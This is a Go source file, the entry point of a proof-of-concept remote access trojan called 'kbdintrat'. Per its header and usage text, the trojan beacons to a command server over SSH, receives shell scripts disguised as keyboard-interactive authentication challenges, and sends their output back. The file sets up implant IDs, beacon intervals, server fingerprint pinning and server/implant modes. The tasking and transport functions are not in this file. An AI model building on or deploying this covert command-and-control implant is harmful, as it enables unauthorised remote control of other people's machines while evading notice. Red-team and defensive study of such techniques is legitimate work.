// Program kbdintrat is a PoC rat which gets tasking using ssh
// keyboard-interactive authentication
package main

/*
 * kbdintrat.go
 * Rat which uses keyboard-interactive auth for tasking
 * By J. Stuart McMurray
 * Created 20190825
 * Last Modified 20190825
 */

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"
)

// IDOK are the letters allowed to be used in an implant ID */
const IDOK = "abcdefghikjlmnopqrstuvwxyzABCDEFGHIKJLMNOPQRSTUVWXYZ0123456789-_"

var (
	// ErrTimeout is returned when tasking hasn't been done in time
	ErrTimeout = errors.New("timeout")
)

func main() {
	/* Set the default implant ID to a random base36 uint64 */
	if "" == ImplantID {
		b := make([]byte, 8)
		_, err := rand.Read(b)
		if nil != err {
			log.Fatalf("Error getting random ID: %v", err)
		}
		ImplantID = strconv.FormatUint(
			binary.LittleEndian.Uint64(b),
			36,
		)
	}

	var (
		timeout = flag.Duration(
			"timeout",
			2*time.Minute,
			"Tasking `timeout`",
		)
		addr = flag.String(
			"address",
			"127.0.0.1:2222",
			"Listen or connect `address`",
		)
		server = flag.Bool(
			"server",
			false,
			"Be a server, not an implant",
		)
		bInt = flag.Duration(
			"beacon",
			10*time.Minute,
			"Beacon `interval`",
		)
		taskingDir = flag.String(
			"tasking",
			"tasking",
			"Tasking `directory` name",
		)
		outputDir = flag.String(
			"output",
			"output",
			"Output `directory` name",
		)
		privKey = flag.String(
			"key",
			"id_rsa",
			"SSH private key `file`",
		)
		fingerprint = flag.String(
			"fingerprint",
			"SHA256:hhjMIcy0uDnnlVqqSL8ShoPuRstMK59im+22McNhtT0",
			"Server key `fingerprint`",
		)
		version = flag.String(
			"version",
			"SSH-2.0-sshbeacon",
			"SSH version `banner`",
		)
		id = flag.String(
			"id",
			ImplantID,
			"Implant `ID`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %v [options]

A cheesy RAT which connects to the server, gets tasking as a
keyboard-interactive auth challenge, and returns the answer as the response.

With -server, acts as the server for the above.  Tasking is given as shell
scripts in the tasking directory with the same name as the SSH username the
RATs specify. Output will be written to similarly-named files in the
output directory.

Options:
`,
			os.Args[0],
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	if *server {
		DoServer(
			*version,
			*privKey,
			*addr,
			*timeout,
			*taskingDir,
			*outputDir,
		)
	} else {
		DoClient(*id, *addr, *bInt, *fingerprint, *timeout, *version)
	}
}

/* TODO: Hello message for first seen implants */
